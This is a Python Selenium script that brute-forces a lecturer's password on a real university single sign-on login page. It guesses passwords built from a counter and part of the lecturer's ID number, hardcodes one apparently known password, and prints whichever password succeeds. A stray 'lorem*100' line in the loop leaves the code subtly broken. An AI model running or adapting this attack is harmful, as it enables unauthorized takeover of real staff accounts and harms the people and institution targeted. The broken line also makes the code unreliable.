from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time
import os

nip = input('Input lecturer\'s id: ')

driver = webdriver.Chrome('./chromedriver.exe')

driver.get("https://sso.upi.edu/cas/login?service=https%3A%2F%2Fspot.upi.edu%2Fberanda")

os.system("cls")

usernameSelector = driver.find_element(By.ID, "username")
usernameSelector.send_keys(nip)

tries = 201897

while True:
  passwordTxt = str(tries)
  for i in range(7 - len(passwordTxt)):
    passwordTxt = ''.join(['0', passwordTxt])
  passwordTxt = passwordTxt + nip[-11:]
  lorem*100
  
  passwordSelector = driver.find_element(By.ID, "password")
  passwordSelector.send_keys(passwordTxt)

  submit = driver.find_element(By.NAME, "submit")
  submit.click()

  print(str(tries) + "). " + passwordTxt)

  try:
    driver.find_element(By.CLASS_NAME, "mini-sidebar")
  except:
    if passwordTxt == "020190719850814101":
      print("found but not detected")
      break
    passwordTxt = ""
    tries += 1
    continue
  break

print("success!, Password is " + passwordTxt)

time.sleep(5)
print(driver.find_element(By.CLASS_NAME, "mini-sidebar").is_displayed())